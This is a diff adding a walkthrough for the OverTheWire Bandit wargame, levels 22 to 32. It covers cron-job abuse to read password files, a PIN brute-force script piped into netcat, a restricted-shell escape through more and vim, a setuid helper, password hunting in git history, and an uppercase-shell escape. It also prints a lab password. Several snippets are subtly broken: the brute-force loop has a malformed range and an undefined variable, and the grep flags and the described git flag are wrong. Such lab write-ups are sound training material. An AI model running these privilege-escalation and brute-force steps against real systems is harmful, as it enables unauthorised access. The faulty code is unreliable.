@@ -718,3 +718,190 @@ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 ```
 
 # Level 22
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.
+
+
+This is very similar to level 21, just follow the trace of the cron tab for bandit23
+```bash
+cat  /etc/cron.d/cronjob_bandit23
+# @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+# * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+cat /usr/bin/cronjob_bandit23.sh
+# If you pay attention to the script content is very simple, just instead of whoami, change for the user you wants the password, in this case bandit23
+
+cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
+```
+# Level 23
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+This is more fun to do, follow the trace is similar to the latest etc/cron.d exercises so let's open the script for bandit24 and see the content:
+```bash
+cat /usr/bin/cronjob_bandit24.sh
+
+# In this one you can translate that is reading files inside /var/spool/bandit24 directory and the content is removed after 60s passed if you are bandit23, so we can take advantage of this to insert our script that is going to read the password of bandit24.
+
+mktemp -d 
+chmod -R o+rwx /tmp/<your-tmp-created/
+
+# Create your script that make a simple cat on /etc/bandit_pass/bandit24 and echo the content in a .txt file. Then copy your script inside /var/spool/bandit24
+cp /tmp/<your-tmp-created>/script.sh /var/spool/bandit24
+```
+
+You can watch every second with the command `watch` for the command ls -lha on the tmp directory, for us is only wait that the .txt file is created with the passwordº
+```bash
+watch -n 1 ls -lha
+```
+# Level 24
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+This one is ugly what is a good exercise to practice brute force in order to get the secret 4 digit pincode
+
+We know that the argument is expecting on port 30002 is the actual level password plus the 4 digit pincode we don't know yet, so let's create the script that generates our dictionary:
+```bash
+#!/bin/bash
+
+password=$(cat /etc/bandit_pass/bandit24)
+file=$1
+
+for digit in {0000.9999}; do
+    echo "$password $code" >> $file
+done
+```
+
+So if we run the script passing the name of the file we want generate, the dictionary should be created with all combinations:
+```bash
+./pincode-dict-generator.sh dictionary.txt
+```
+
+With this new dictionary file and netcat, the pleasure is served
+```bash
+# We remove the lines with 'Wrong' and 'Please' to avoid overwhelm the terminal outputº
+cat dictionary.txt | nc localhost 30002 | grep -eV "Wrong|Please"
+
+# And now just wait until this message appears
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting
+```
+# Level 25
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+This level is to practice on the concept of 'jail shell', in this case we're going to take in advantage the more command the is using the actual bash of bandit26. If we take a look what bash this user have we must see:
+```bash
+cat /etc/passwd | grep bandit26
+# bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+If we open the content of the showtext 
+
+cat /usr/bin/showtext
+# #!/bin/sh
+
+# export TERM=linux
+
+# more ~/text.txt
+#exit 
+```
+Yeah, let's exploit this more with a jail shell. If you try to connect via ssh with the key we have in our home directory the connection into localhost is closed
+```bash
+ssh -i ./bandit26.ssh_key bandit26@localhost
+# Connection to localhost is closed
+```
+Just move the terminal to be very minimal and try to connect via ssh, if you did this correctly, you should see a 'More 50% text' that is the pagination of the more command, from here we can spawn the vim code editor with the key 'v'.
+
+From here just:
+```bash
+:set shell=/bin/bash
+
+# and then 
+:shell
+```
+Perfect, bash spawned, get the flag but don't exit the server because this is the only way to access bandit26 level`
+# Level 26
+Good job getting a shell! Now hurry and grab the password for bandit27!
+
+On the home directory we have a binary to execute commands as bandit27 (don't know why this level is so easy, maybe to relax our minds)
+```bash
+# Spawn a bash as bandit27 user
+./bandit27-do bash -p
+# or just read the flag for next level
+./bandit27-do cat /etc/bandit_pass/bandit27
+```
+# Level 27
+There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo. The password for the user bandit27-git is the same as for the user bandit27.
+
+The first thing that comes into your mind is connect directly via ssh into this address but if you try that the connection will be closed but a message appears sharing the information that a git shell interactive is available so we can run commands into this address, let's do a clone:
+```bash
+git clone ssh://bandit27-git@localhost/home/bandit27-git/rep
+```
+Inside this repo there is a README file where we can find the password for the next level
+# Level 28
+There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28.
+
+Clone the repository and find the password for the next level
+
+In this one we have the same as the last level but in this case we need to see the git log because the actual readme doesn't have the credentials
+So just run after clone the repo the command:
+```bash
+git log -p
+# This should display the diff on the last commit and now you can see the password
+```
+# Level 29
+There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29.
+
+Clone the repository and find the password for the next level.
+
+Another git repo but this time in the actual branch the commits doesn't show the password so we need to list the available branchs with:
+```bash
+git branch -r && git checkout origin/dev && git log -p
+```
+And you'll see the password, magic
+
+# Level 30
+There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo. The password for the user bandit30-git is the same as for the user bandit30.
+
+Clone the repository and find the password for the next level.
+
+Anoter tricky repository, this time we don't have interesting commits or branchs but now we have the tag information so:
+```bash
+git tag # show 'secret'
+git show secret
+# Voila, the password
+```
+
+# Level 31
+There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo. The password for the user bandit31-git is the same as for the user bandit31.
+
+Clone the repository and find the password for the next level.
+
+Maybe this one is the more funny of the git repositories, if you clone this repo you'll see a README giving us information that in order to retrieve the password we need to push a key.txt file into the repository but we need to do some stuff before:
+```bash
+# We need to copy the .gitconfig into this repository cloned
+cp ~/.gitconfig ~/tmp/<your-temp-directory>/repo
+
+cd /tmp/<your-temp-<directory>/repo 
+echo "May I come in?" > key.txt
+
+# If you try to add into a new commit you'll see that key.txt is ignoring, we need pass the flag -g to force add this file bypassing .gitignore
+git add -f key.txt
+git push origin master
+3 And you'll receive the password on the message after the push :)º
+```
+# Level 32 (final boss)
+After all this git stuff its time for another escape. Good luck!
+
+Here we can see an uppercase shell that transform all our command into uppercase so we always get a <COMMAND>: not found. To escape from this we can spawn a new shell with 
+```bash
+$0
+
+# And then run commands as normal
+cat /etc/bandit_pass/bandit33
+```
+
+
